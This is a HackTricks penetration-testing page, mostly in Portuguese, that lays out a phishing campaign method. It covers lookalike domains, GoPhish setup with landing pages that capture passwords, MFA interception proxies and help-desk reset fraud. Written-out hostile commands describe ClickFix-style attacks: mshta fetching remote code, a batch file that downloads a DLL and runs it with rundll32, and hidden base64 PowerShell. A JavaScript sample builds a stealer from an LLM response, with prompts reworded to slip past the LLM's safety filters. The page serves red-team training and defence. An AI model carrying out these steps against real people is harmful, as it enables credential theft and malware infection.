# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon the victim
1. Select the **victim domain**.
2. Perform some basic web enumeration **searching for login portals** used by the victim and **decide** which one you will **impersonate**.
3. Use some **OSINT** to **find emails**.
2. Prepare the environment
1. **Buy the domain** you are going to use for the phishing assessment
2. **Configure the email service** related records (SPF, DMARC, DKIM, rDNS)
3. Configure the VPS with **gophish**
3. Prepare the campaign
1. Prepare the **email template**
2. Prepare the **web page** to steal the credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: O domain name **contém** uma **palavra-chave** importante do domínio original (e.g., zelster.com-management.com).
- **hypened subdomain**: Troque o **ponto por um hífen** de um subdomínio (e.g., www-zelster.com).
- **New TLD**: Mesmo domínio usando um **novo TLD** (e.g., zelster.org)
- **Homoglyph**: **Substitui** uma letra no domain name por **letras que parecem semelhantes** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Troca duas letras** dentro do domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Adiciona ou remove “s” no final do domain name (e.g., zeltsers.com).
- **Omission**: **Remove uma** das letras do domain name (e.g., zelser.com).
- **Repetition:** **Repete uma** das letras no domain name (e.g., zeltsser.com).
- **Replacement**: Como homoglyph, mas menos stealthy. Substitui uma das letras no domain name, talvez por uma letra próxima da original no teclado (e.g, zektser.com).
- **Subdomained**: Introduz um **ponto** dentro do domain name (e.g., ze.lster.com).
- **Insertion**: **Insere uma letra** no domain name (e.g., zerltser.com).
- **Missing dot**: Acrescente o TLD ao domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

There is a **possibility that one of some bits stored or in communication might get automatically flipped** due to various factors like solar flares, cosmic rays, or hardware errors.

When this concept is **applied to DNS requests**, it is possible that the **domain received by the DNS server** is not the same as the domain initially requested.

For example, a single bit modification in the domain "windows.com" can change it to "windnws.com."

Attackers may **take advantage of this by registering multiple bit-flipping domains** that are similar to the victim's domain. Their intention is to redirect legitimate users to their own infrastructure.

For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

You can search in [https://www.expireddomains.net/](https://www.expireddomains.net) for a expired domain that you could use.\
In order to make sure that the expired domain that you are going to buy **has already a good SEO** you could search how is it categorized in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

In order to **discover more** valid email addresses or **verify the ones** you have already discovered you can check if you can brute-force them smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moreover, don't forget that if the users use **any web portal to access their mails**, you can check if it's vulnerable to **username brute force**, and exploit the vulnerability if possible.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuração

**Configuração do certificado TLS**

Antes desta etapa, você já deve ter **comprado o domínio** que vai usar e ele deve estar **apontando** para o **IP da VPS** onde você está configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configuração de Mail**

Comece instalando: `apt-get install postfix`

Depois adicione o domínio aos seguintes arquivos:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Altere também os valores das seguintes variáveis dentro de /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Por fim, modifique os arquivos **`/etc/hostname`** e **`/etc/mailname`** para o nome do seu domínio e **reinicie sua VPS.**

Agora, crie um **registro DNS A** de `mail.<domain>` apontando para o **endereço IP** da VPS e um **registro DNS MX** apontando para `mail.<domain>`

Agora vamos testar o envio de um email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configuração do Gophish**

Pare a execução do gophish e vamos configurá-lo.\
Modifique `/opt/gophish/config.json` para o seguinte (observe o uso de https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configurar o serviço gophish**

Para criar o serviço gophish para que ele possa ser iniciado automaticamente e gerenciado como um serviço, você pode criar o arquivo `/etc/init.d/gophish` com o seguinte conteúdo:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Termine de configurar o serviço e verifique-o fazendo:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurando servidor de mail e domínio

### Espere & seja legítimo

Quanto mais antigo for um domínio, menor a probabilidade de ele ser detectado como spam. Então você deve esperar o máximo de tempo possível (pelo menos 1 semana) antes da avaliação de phishing. Além disso, se você colocar uma página sobre um setor de boa reputação, a reputação obtida será melhor.

Observe que, mesmo que você tenha que esperar uma semana, você pode terminar de configurar tudo agora.

### Configure o registro Reverse DNS (rDNS)

Defina um registro rDNS (PTR) que resolva o endereço IP da VPS para o nome de domínio.

### Sender Policy Framework (SPF) Record

Você deve **configurar um registro SPF para o novo domínio**. Se você não sabe o que é um registro SPF [**leia esta página**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Você pode usar [https://www.spfwizard.net/](https://www.spfwizard.net) para gerar sua política SPF (use o IP da máquina VPS)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Este é o conteúdo que deve ser definido dentro de um registro TXT no domínio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Registro de Domain-based Message Authentication, Reporting & Conformance (DMARC)

Você deve **configurar um registro DMARC para o novo domínio**. Se você não sabe o que é um registro DMARC [**leia esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Você tem que criar um novo registro DNS TXT apontando o hostname `_dmarc.<domain>` com o seguinte conteúdo:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Você deve **configurar um DKIM para o novo domínio**. Se você não sabe o que é um registro DMARC [**leia esta página**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Este tutorial é baseado em: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Você precisa concatenar ambos os valores B64 que a chave DKIM gera:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Teste sua pontuação de configuração de email

Você pode fazer isso usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Basta acessar a página e enviar um email para o endereço que eles fornecem:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Você também pode **verificar sua configuração de email** enviando um email para `check-auth@verifier.port25.com` e **lendo a resposta** (para isso, você precisará **abrir** a porta **25** e ver a resposta no arquivo _/var/mail/root_ se você enviar o email como root).\
Verifique se você passa em todos os testes:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Você também pode enviar **message para um Gmail sob seu controle** e verificar os **headers do email** na sua caixa de entrada do Gmail; `dkim=pass` deve estar presente no campo de header `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removendo da Blacklist do Spamhouse

A página [www.mail-tester.com](https://www.mail-tester.com) pode indicar se o seu domínio está sendo bloqueado pelo spamhouse. Você pode solicitar a remoção do seu domínio/IP em: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removendo da Blacklist da Microsoft

​​Você pode solicitar a remoção do seu domínio/IP em [https://sender.office.com/](https://sender.office.com).

## Criar & Iniciar Campanha GoPhish

### Perfil de Envio

- Defina algum **nome para identificar** o perfil do remetente
- Decida de qual conta você vai enviar os phishing emails. Sugestões: _noreply, support, servicedesk, salesforce..._
- Você pode deixar em branco o username e a password, mas certifique-se de marcar Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> É recomendado usar a funcionalidade "**Send Test Email**" para testar se tudo está funcionando.\
> Eu recomendaria **enviar os emails de teste para endereços de 10min mails** a fim de evitar ser colocado em blacklist ao fazer testes.

### Template de Email

- Defina algum **nome para identificar** o template
- Depois escreva um **subject** (nada de estranho, apenas algo que você esperaria ler em um email regular)
- Certifique-se de ter marcado "**Add Tracking Image**"
- Escreva o **email template** (você pode usar variáveis como no exemplo a seguir):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note que **para aumentar a credibilidade do email**, é recomendado usar alguma assinatura de um email do cliente. Sugestões:

- Envie um email para um endereço **inexistente** e verifique se a resposta tem alguma assinatura.
- Pesquise por **emails públicos** como info@ex.com ou press@ex.com ou public@ex.com e envie um email e aguarde a resposta.
- Tente contatar **algum email válido descoberto** e aguarde a resposta

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> O Email Template também permite **anexar arquivos para enviar**. Se você também quiser roubar desafios NTLM usando alguns arquivos/documentos especialmente criados [leia esta página](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Escreva um **nome**
- **Escreva o código HTML** da página web. Note que você pode **importar** páginas web.
- Marque **Capture Submitted Data** e **Capture Passwords**
- Defina um **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Normalmente você precisará modificar o código HTML da página e fazer alguns testes localmente (talvez usando algum servidor Apache) **até gostar dos resultados.** Depois, escreva esse código HTML na caixa.\
> Note que, se você precisar **usar alguns recursos estáticos** para o HTML (talvez algumas páginas CSS e JS) você pode salvá-los em _**/opt/gophish/static/endpoint**_ e depois acessá-los em _**/static/\<filename>**_

> [!TIP]
> Para o redirection você pode **redirecionar os usuários para a página principal legítima** da vítima, ou redirecioná-los para _/static/migration.html_ por exemplo, colocar alguma **roda girando (**[**https://loading.io/**](https://loading.io)**) por 5 segundos e depois indicar que o processo foi bem-sucedido**.

### Users & Groups

- Defina um nome
- **Importe os dados** (note que, para usar o template do exemplo, você precisa do firstname, last name e endereço de email de cada usuário)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Por fim, crie uma campanha selecionando um nome, o email template, a landing page, a URL, o sending profile e o grupo. Note que a URL será o link enviado para as vítimas

Note que o **Sending Profile permite enviar um email de teste para ver como ficará o email final de phishing**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Eu recomendaria **enviar os emails de teste para endereços 10min mails** para evitar ser colocado em blacklist ao fazer testes.

Quando tudo estiver pronto, basta iniciar a campanha!

## Website Cloning

Se por qualquer motivo você quiser clonar o website, confira a seguinte página:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Em algumas avaliações de phishing (principalmente para Red Teams) você vai querer também **enviar arquivos contendo algum tipo de backdoor** (talvez um C2 ou talvez apenas algo que acione uma autenticação).\
Confira a seguinte página para alguns exemplos:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

O ataque anterior é bem inteligente, pois você está falsificando um website real e coletando as informações inseridas pelo usuário. Infelizmente, se o usuário não digitou a senha correta ou se a aplicação falsificada está configurada com 2FA, **essa informação não permitirá que você se faça passar pelo usuário enganado**.

É aqui que ferramentas como [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena) são úteis. Esta ferramenta permitirá que você gere um ataque parecido com MitM. Basicamente, o ataque funciona da seguinte maneira:

1. Você **imita o login** do formulário da página web real.
2. O usuário **envia** suas **credenciais** para sua página falsa e a ferramenta envia isso para a página web real, **verificando se as credenciais funcionam**.
3. Se a conta estiver configurada com **2FA**, a página MitM pedirá isso e, assim que o **usuário o inserir**, a ferramenta enviará para a página web real.
4. Assim que o usuário estiver autenticado, você (como atacante) terá **capturado as credenciais, o 2FA, o cookie e qualquer informação** de cada interação do usuário enquanto a ferramenta estiver realizando um MitM.

### Via VNC

E se, em vez de **enviar a vítima para uma página maliciosa** com a mesma aparência da original, você a enviar para uma **sessão VNC com um navegador conectado à página web real**? Você poderá ver o que ele faz, roubar a senha, o MFA usado, os cookies...\
Você pode fazer isso com [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Obviamente, uma das melhores formas de saber se você foi descoberto é **procurar seu domínio dentro de blacklists**. Se ele aparecer listado, de alguma forma seu domínio foi detectado como suspeito.\
Uma maneira fácil de verificar se seu domínio aparece em alguma blacklist é usar [https://malwareworld.com/](https://malwareworld.com)

No entanto, existem outras formas de saber se a vítima está **procurando ativamente por atividade de phishing suspeita na internet**, como explicado em:


{{#ref}}
detecting-phising.md
{{#endref}}

Você pode **comprar um domínio com um nome muito semelhante** ao domínio das vítimas **e/ou gerar um certificado** para um **subdomínio** de um domínio controlado por você **contendo** a **palavra-chave** do domínio da vítima. Se a **vítima** realizar qualquer tipo de **interação DNS ou HTTP** com eles, você saberá que **ela está procurando ativamente** por domínios suspeitos e você precisará ser muito furtivo.

### Evaluate the phishing

Use [**Phishious** ](https://github.com/Rices/Phishious)para avaliar se seu email vai acabar na pasta de spam ou se vai ser bloqueado ou bem-sucedido.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Grupos modernos de intrusão cada vez mais pulam iscas por email por completo e **miram diretamente o fluxo de service-desk / identity-recovery** para burlar MFA. O ataque é totalmente "living-off-the-land": uma vez que o operador obtém credenciais válidas, ele faz pivot com ferramentas administrativas nativas – nenhum malware é necessário.

### Attack flow
1. Recon da vítima
* Coletar detalhes pessoais e corporativos do LinkedIn, vazamentos de dados, GitHub público, etc.
* Identificar identidades de alto valor (executivos, TI, finanças) e enumerar o **processo exato do help-desk** para reset de senha / MFA.
2. Engenharia social em tempo real
* Ligar, mandar Teams ou chat para o help-desk se passando pelo alvo (geralmente com **caller-ID spoofed** ou **voz clonada**).
* Fornecer o PII coletado anteriormente para passar pela verificação baseada em conhecimento.
* Convencer o agente a **resetar o segredo do MFA** ou realizar um **SIM-swap** em um número de celular registrado.
3. Ações imediatas pós-acesso (≤60 min em casos reais)
* Estabelecer um ponto de apoio por qualquer portal web SSO.
* Enumerar AD / AzureAD com ferramentas nativas (sem binários soltos):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Movimento lateral com **WMI**, **PsExec** ou agentes legítimos de **RMM** já permitidos no ambiente.

### Detection & Mitigation
* Trate a recuperação de identidade do help-desk como uma **operação privilegiada** – exija step-up auth e aprovação do gerente.
* Implante regras de **Identity Threat Detection & Response (ITDR)** / **UEBA** que alertem sobre:
* Método de MFA alterado + autenticação a partir de novo dispositivo / geo.
* Elevação imediata do mesmo principal (user-→-admin).
* Registre chamadas do help-desk e imponha um **retorno de chamada para um número já registrado** antes de qualquer reset.
* Implemente **Just-In-Time (JIT) / Privileged Access** para que contas recém-resetadas **não** herdem automaticamente tokens de alto privilégio.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Grupos commodity compensam o custo de operações high-touch com ataques em massa que transformam **motores de busca e redes de anúncios no canal de entrega**.

1. **SEO poisoning / malvertising** empurra um resultado falso como `chromium-update[.]site` para o topo dos anúncios de busca.
2. A vítima baixa um pequeno **first-stage loader** (geralmente JS/HTA/ISO). Exemplos vistos pela Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. O loader exfiltra cookies do navegador + credential DBs, depois baixa um **silent loader** que decide – *em tempo real* – se vai implantar:
* RAT (por exemplo, AsyncRAT, RustDesk)
* ransomware / wiper
* componente de persistência (chave Run do registry + tarefa agendada)

### Hardening tips
* Bloqueie domínios recém-registrados e imponha **Advanced DNS / URL Filtering** em *search-ads* assim como em e-mail.
* Restrinja a instalação de software a pacotes MSI / Store assinados, negue a execução de `HTA`, `ISO`, `VBS` por política.
* Monitore processos filhos de navegadores abrindo instaladores:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Procure por LOLBins frequentemente abusados por first-stage loaders (por exemplo `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Alguns portais falsos de software mantêm o `href` visível do download apontando para a URL **real** do GitHub/release, mas sequestram a **primeira** interação do usuário em JavaScript e enviam a vítima para uma cadeia de **Traffic Distribution System (TDS)** em vez disso.
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Key traits:
- O hook geralmente roda na **capture phase** (`true`) no `document`, então dispara antes dos handlers do site.
- Chrome often uses `mousedown` instead of `click` para manter o redirect ligado a um **user gesture** válido e melhorar o bypass de popup-blocker.
- Algumas variantes abrem `about:blank` antecipadamente ou sintetizam cliques em `<a target="_blank">` e só depois atribuem a URL do TDS.
- Limites no lado do browser normalmente ficam em `localStorage`, então o **first click** pode alcançar o malware enquanto refreshes/retries voltam para o link visível aparentemente benigno.
- O TDS pode fazer gate por referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context e contadores por sessão, tornando as replays do analyst não determinísticas.

Defender ideas:
- Compare o `href` **exibido** com o alvo de navegação **real** gerado no momento do clique.
- Procure handlers `document.addEventListener(..., true)` que chamem tanto `preventDefault()` quanto `stopImmediatePropagation()` em torno de `window.open`, `about:blank`, ou cliques sintéticos em anchor.
- Trate clusters de domínios recém-registrados de download de software que todos carregam o mesmo estágio CloudFront/JS como um padrão de alto sinal de SEO-poisoning/TDS.

### ClickFix from fake verification pages + archive-looking LOLBAS fetches
Alguns branches do TDS terminam em uma fake verification page (estilo Cloudflare/IUAM) que diz à vítima para executar um binário confiável do Windows como:
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notas:
- `mshta.exe` executa o **HTA/VBScript no início da resposta**, mesmo se a URL fingir ser um arquivo `.7z`; dados de arquivo anexados podem ser puro isca.
- As etapas seguintes geralmente continuam mentindo sobre o tipo de arquivo (`.rtf` para PowerShell, `.asar` para Python, ZIPs com binaries preenchidos) e então mudam para **manual PE mapping / in-memory execution**.
- Se você estiver respondendo a uma dessas cadeias, preserve **network + memory from the first successful run**: replays posteriores podem mostrar apenas um caminho benigno de installer/SFX ou falhar porque a payload/key release estava vinculada à sessão original do TDS.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Isca: advisory nacional de CERT clonado com um botão **Update** que exibe instruções “fix” passo a passo. As vítimas são instruídas a executar um batch que baixa uma DLL e a executa via `rundll32`.
* Cadeia batch típica observada:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` solta a payload em `%TEMP%`, uma pausa curta esconde o network jitter, e então `rundll32` chama o entrypoint exportado (`notepad`).
* A DLL faz beacon da identidade do host e consulta o C2 a cada poucos minutos. O tasking remoto chega como **base64-encoded PowerShell** executado oculto e com policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Isso preserva a flexibilidade do C2 (o servidor pode trocar tasks sem atualizar a DLL) e esconde janelas de console. Procure filhos do PowerShell de `rundll32.exe` usando `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` juntos.
* Defensores podem procurar callbacks HTTP(S) no formato `...page.php?tynor=<COMPUTER>sss<USER>` e intervalos de polling de 5 minutos após o carregamento da DLL.

---

## AI-Enhanced Phishing Operations
Atacantes agora encadeiam **LLM & voice-clone APIs** para iscas totalmente personalizadas e interação em tempo real.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Adicione **dynamic banners** destacando mensagens enviadas por automação não confiável (via anomalias ARC/DKIM).
• Implante **voice-biometric challenge phrases** para solicitações telefônicas de alto risco.
• Simule continuamente iscas geradas por IA em programas de awareness – templates estáticos estão obsoletos.

Veja também – abuso de agentic browsing para credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Veja também – abuso de agentes de IA em ferramentas CLI locais e MCP (para inventory e detection de secrets):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Atacantes podem enviar HTML aparentemente benigno e **gerar o stealer em runtime** pedindo a uma **trusted LLM API** JavaScript, e então executando-o no navegador (por exemplo, `eval` ou `<script>` dinâmico).

1. **Prompt-as-obfuscation:** codifique exfil URLs/Base64 strings no prompt; itere a redação para contornar filtros de segurança e reduzir hallucinations.
2. **Client-side API call:** no carregamento, o JS chama um LLM público (Gemini/DeepSeek/etc.) ou um proxy CDN; apenas o prompt/chamada de API está presente no HTML estático.
3. **Assemble & exec:** concatene a resposta e execute-a (polymorphic por visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** o código gerado personaliza o lure (por exemplo, parsing de token do LogoKit) e envia creds para o endpoint oculto no prompt.

**Atributos de evasão**
- O tráfego atinge domínios de LLM bem conhecidos ou proxies CDN reputados; às vezes via WebSockets para um backend.
- Não há payload estático; o JS malicioso existe apenas após o render.
- Gerações não determinísticas produzem **stealers** únicos por sessão.

**Ideias de detecção**
- Execute sandboxes com JS habilitado; sinalize **`eval`/criação dinâmica de script em runtime oriunda de respostas de LLM**.
- Procure POSTs de front-end para APIs de LLM imediatamente seguidos por `eval`/`Function` no texto retornado.
- Alerta para domínios de LLM não autorizados no tráfego do client, além de subsequentes POSTs de credenciais.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Além do push-bombing clássico, os operadores simplesmente **forçam um novo registro de MFA** durante a ligação com o help-desk, anulando o token existente do usuário. Qualquer prompt de login subsequente parece legítimo para a vítima.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitore eventos do AzureAD/AWS/Okta onde **`deleteMFA` + `addMFA`** ocorram **em minutos a partir do mesmo IP**.



## Clipboard Hijacking / Pastejacking

Atacantes podem copiar silenciosamente comandos maliciosos para a área de transferência da vítima a partir de uma página web comprometida ou typosquatted e depois enganar o usuário para colá-los dentro de **Win + R**, **Win + X** ou uma janela de terminal, executando código arbitrário sem qualquer download ou anexo.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* Uma lure page (e.g., fake ministry/CERT “channel”) exibe um WhatsApp Web/Desktop QR e instrui a vítima a escanear, adicionando silenciosamente o atacante como um **linked device**.
* O atacante imediatamente ganha visibilidade de chat/contact até que a sessão seja removida. As vítimas podem depois ver uma notificação de “new device linked”; defensores podem caçar eventos inesperados de device-link logo após visitas a páginas QR não confiáveis.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operadores estão cada vez mais colocando seus fluxos de phishing atrás de uma verificação simples de dispositivo para que crawlers de desktop nunca cheguem às páginas finais. Um padrão comum é um pequeno script que testa um DOM com suporte a touch e envia o resultado para um endpoint do servidor; clientes não‑mobile recebem HTTP 500 (ou uma página em branco), enquanto usuários mobile recebem o fluxo completo.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` lógica (simplificada):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Comportamento do servidor frequentemente observado:
- Define um cookie de sessão durante o primeiro carregamento.
- Aceita `POST /detect {"is_mobile":true|false}`.
- Retorna 500 (ou placeholder) para GETs subsequentes quando `is_mobile=false`; entrega phishing apenas se `true`.

Heurísticas de hunting e detecção:
- Consulta no urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria web: sequência de `GET /static/detect_device.js` → `POST /detect` → HTTP 500 para não-mobile; caminhos legítimos de vítima mobile retornam 200 com HTML/JS subsequente.
